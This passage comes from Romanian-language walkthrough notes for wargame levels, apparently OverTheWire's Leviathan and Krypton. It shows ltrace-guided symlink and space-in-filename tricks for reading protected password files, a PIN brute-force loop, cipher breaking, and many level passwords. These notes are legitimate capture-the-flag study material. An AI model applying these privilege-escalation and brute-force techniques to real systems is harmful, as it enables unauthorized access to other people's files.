+geteuid()                                        = 12002
+geteuid()                                        = 12002
+setreuid(12002, 12002)                           = 0
+system("/bin/cat test.txt" <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 0
++++ exited (status 0) +++
+-access() -verifica permisiunile user-ului real(cel care detine procesul), nu ale celui efectiv(cel pe care ilcauta SO pentru a lua decizii), deci printfile ar putea fi executat cu privilegile lui leviathan3, detinatorul fisierului
+-/bin/cat -se mai poate presupune ca /bin/cat foloseste doar o parte din cale, nu toata calea; daca am avea un fisier cu numele compus din 2 cuvinte, separate prin spatiu, am putea sa profitam de aceasta eroare de securitate
+	touch pass\ file.txt
+	ltrace ~/printfile 'pass file.txt'
+__libc_start_main(0x804852b, 2, 0xffffd744, 0x8048610 <unfinished ...>
+access("pass file.txt", 4)                       = 0
+snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt") = 22
+geteuid()                                        = 12002
+geteuid()                                        = 12002
+setreuid(12002, 12002)                           = 0
+system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
+/bin/cat: file.txt: No such file or directory
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 256
++++ exited (status 0) +++
+-dupa cum se poate observa, presupunerea a fost corecta, iar /bin/cat trateaza fisierul nostru ca 2 fisiere distincte
+-vom crea simbolic fisierul pass, in legatura directa cu /etc/leviathan_pass/leviathan3
+	ln -s /etc/leviathan_pass/leviathan3 pass
+	ls -la
+total 268
+drwxr-sr-x   2 leviathan2 root   4096 Jun 22 09:43 .
+drwxrws-wt 255 root       root 266240 Jun 22 09:41 ..
+lrwxrwxrwx   1 leviathan2 root     30 Jun 22 09:43 pass -> /etc/leviathan_pass/leviathan3
+-rw-r--r--   1 leviathan2 root      0 Jun 22 09:40 pass file.txt
+	~/printfile "pass file.txt"
+Ahdiemoo1j
+/bin/cat: file.txt: No such file or directory
+
+Level 3
+	ls
+level3
+	./level3
+Enter the password> 1234
+bzzzzzzzzap. WRONG
+	ltrace ./level3
+__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
+strcmp("h0no33", "kakaka")                       = -1
+printf("Enter the password> ")                   = 20
+fgets(Enter the password> 1234
+"1234\n", 256, 0xf7fc55a0)                 = 0xffffd590
+strcmp("1234\n", "snlprintf\n")                  = -1
+puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+)                       = 19
++++ exited (status 0) +++
+-observam ca parola este: snlprintf
+	./level3
+Enter the password> snlprintf
+[You've got shell]!
+	$ whoami
+leviathan4
+	$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+
+Level 4
+	ls
+	ls -a
+.  ..  .bash_logout  .bashrc  .profile  .trash
+	cd .trash/
+	ls
+bin
+	./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
+-avem un putput in binar
+-il vom converti in ASCII pentru a obtine parola
+Tith4cokei
+
+Level 5
+	ls
+leviathan5
+	./leviathan5 
+Cannot find /tmp/file.log
+	ltrace ./leviathan5 
+__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
+fopen("/tmp/file.log", "r")                      = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+-pentru ca fisierul /temp/file.log nu exista, dar este folosit in script, vom crea un symlink al lui /etc/leviathan_pass/leviathan6 in interiorul sau, pentru a putea accesa parola
+	ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+	./leviathan5 
+UgaoFee4li
+
+Level 6
+	ls
+leviathan6
+	./leviathan6 
+usage: ./leviathan6 <4 digit code>
+	ltrace ./leviathan6 
+__libc_start_main(0x804853b, 1, 0xffffd784, 0x80485e0 <unfinished ...>
+printf("usage: %s <4 digit code>\n", "./leviathan6"usage: ./leviathan6 <4 digit code>
+) = 35
+exit(-1 <no return ...>
++++ exited (status 255) +++
+	./leviathan6 0000
+Wrong
+-observam ca pentru a putea obtine parola, este nevoie de un pin foartmat din 4 cifre, pe care nu il cunoastem
+-vom scrie in directorul /tmp/j6 un script a.sh, cu continutul:
+#!/bin/bash
+
+for a in {0000..9999}
+do
+~/leviathan6 $a
+done
+	chmod u+x a.sh
+	./a.sh
+-dupa rulare, vom trece din nou intru-un not-root user
+	whoami
+leviathan7
+	cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+
+*Krypton
+Level 1
+-decodificarea parolei: echo "S1JZUFRPTklTR1JFQVQ=" | base64 -d ->KRYPTONISGREAT
+	ls
+	cd /krypton
+	ls
+krypton1  krypton2  krypton3  krypton4  krypton5  krypton6
+	cd krypton1
+	ls
+krypton2  README
+-parola se afla in krypton2 si este codificata cu ajutorul codificarii ROT13
+	cat krypton2 
+YRIRY GJB CNFFJBEQ EBGGRA
+	cat krypton2 | tr [n-za-mN-ZA-M] [a-zA-Z]
+LEVEL TWO PASSWORD ROTTEN
+
+Level 2
+	cd /krypton/
+	ls
+krypton1  krypton2  krypton3  krypton4  krypton5  krypton6
+	cd krypton2
+	ls
+encrypt  keyfile.dat  krypton3  README
+
+	cat krypton3 | tr [m-za-lM-ZA-L] [a-zA-Z]
+CAESARISEASY
+	cat krypton3 
+OMQEMDUEQMEK
+	cat krypton3 | tr [m-za-lM-ZA-L] [a-zA-Z]
+CAESARISEASY
+
+Level 3
+	cd /krypton/
+	ls
+krypton1  krypton2  krypton3  krypton4  krypton5  krypton6
+	cd krypton3
+	ls
+found1  found2  found3  HINT1  HINT2  krypton4  README
+	cat krypton4 
+KSVVW BGSJD SVSIS VXBMN YQUUK BNWCU ANMJS
+-pentru decodificarea mesajului am adaugat in decodificatorul quipquip mesajele din fisierele found1, found2 si found3, fiind criptate cu acelasi codificator
+-dupa decodificare, singurul fisier care a fost decodificat in text citet in limba engleza a fost found1
+-astfel am decis sa adaug parola la finalul fisierului found1, dupa decodificare am obtinut:
+WELL DONE THE LEVEL FOUR PASSWORD IS BRUTE
+
+Level 4
+	cd /krypton/
+	ls
+krypton1  krypton2  krypton3  krypton4  krypton5  krypton6
+	cd krypton4
+	ls
+found1  found2  HINT  krypton5  README
+	cat krypton5 
+HCIKV RJOX
+-in engleza cele mai aparute caractere intr-o propozitie sunt THE ->key=FRE
+-HCIKVRJOX - FREFREFRE ->CLEARTEXT
+
+Level 5
+	cd /krypton/
+	ls
+krypton1  krypton2  krypton3  krypton4  krypton5  krypton6
+	cd krypton5
+	ls
+found1  found2  found3  krypton6  README
+	cat README 
+Frequency analysis can break a known key length as well.  Lets try one
+last polyalphabetic cipher, but this time the key length is unknown.
+Enjoy.
+	cat krypton6 
+BELOS Z
+-vom folosi pentru decriptare vigenere.php
+-introducem in ciphertext textul din fisierul found1
+-key length va fi 9 si obtinem cheia: xeylencth, care rearanjata ar putea fi keylength
+- o folosim pe cea din urma pentru decodificarea parolei si obtinem:
+RANDOM
+
+Level 6
+	cd /krypton/krypton6
+	ls
+encrypt6  HINT1  HINT2  keyfile.dat  krypton7  onetime  README
+	./encrypt6 
+usage: encrypt6 foo bar 
+Where: foo is the file containing the plaintext and bar is the destination ciphertext file.
+	mkdir /tmp/k6
+	cd /tmp/k6
+	ln -s /krypton/krypton6/keyfile.dat 
+	ls
+keyfile.dat
+	python -c "print 'A'*100" >f1
+	cat f1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	/krypton/krypton6/encrypt6 f1 f2
+	cat f2
+EICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZKTHNSIRFXYCPFUEOCKRNEICTDGYIYZ-> key
+	cat /krypton/krypton6/krypton7 
+PNUKLYLWRQKGKBE-> ciphertext
+
+
